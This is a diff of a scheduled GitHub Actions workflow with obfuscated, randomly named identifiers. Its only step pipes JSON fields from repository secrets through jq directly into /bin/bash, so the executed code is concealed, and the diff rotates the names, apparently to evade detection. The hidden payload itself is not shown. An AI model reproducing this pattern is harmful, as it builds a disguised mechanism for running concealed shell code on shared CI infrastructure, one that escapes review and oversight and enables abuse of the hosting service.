@@ -1,30 +1,32 @@
 name: yanfusu1932
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 2/6 * * *'
+    - cron: '52 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yanfusu1932
         env:
-          gil5: ${{ secrets.gil5 }}
+          ys1: ${{ secrets.ys1 }}
         run: |
-          echo $gil5 | jq -r .qkhg18904 | /bin/bash
-          echo $ifd7 | jq -r .cxi10 | /bin/bash
-          echo $cdi7 | jq -r .c5 | /bin/bash
-          echo $xkwcq233 | jq -r .nqe01166 | /bin/bash
-          echo $npf9270 | jq -r .kxm52 | /bin/bash
-          echo $qtcoz6737 | jq -r .sh60 | /bin/bash
-          echo $ozxo6 | jq -r .zx70 | /bin/bash
-          echo $q0174 | jq -r .nh4 | /bin/bash
-          echo $mo464 | jq -r .gi0709 | /bin/bash
-          echo $i9 | jq -r .g88 | /bin/bash
-          echo $c12432 | jq -r .e2341 | /bin/bash
-          echo $lc10 | jq -r .nls9 | /bin/bash
-          echo $r6 | jq -r .fpkl667 | /bin/bash
-          echo $z94571 | jq -r .ntli9026 | /bin/bash
-          echo $kg1467 | jq -r .rfz15773 | /bin/bash
+          echo $ys1 | jq -r .qwa5 | /bin/bash
+          echo $ezz847 | jq -r .iuv206 | /bin/bash
+          echo $vctsl127 | jq -r .zgkeu7 | /bin/bash
+          echo $fs9 | jq -r .jdmi363 | /bin/bash
+          echo $p494 | jq -r .jx09603 | /bin/bash
+          echo $smozy5784 | jq -r .hex749 | /bin/bash
+          echo $y8 | jq -r .dnjg59 | /bin/bash
+          echo $l838 | jq -r .xc650 | /bin/bash
+          echo $vgubt40452 | jq -r .owrj9000 | /bin/bash
+          echo $jp225 | jq -r .zesf62 | /bin/bash
+          echo $bn772 | jq -r .w41221 | /bin/bash
+          echo $r59502 | jq -r .bqb23699 | /bin/bash
+          echo $q50926 | jq -r .lzmfu39233 | /bin/bash
+          echo $m30026 | jq -r .iu93 | /bin/bash
 
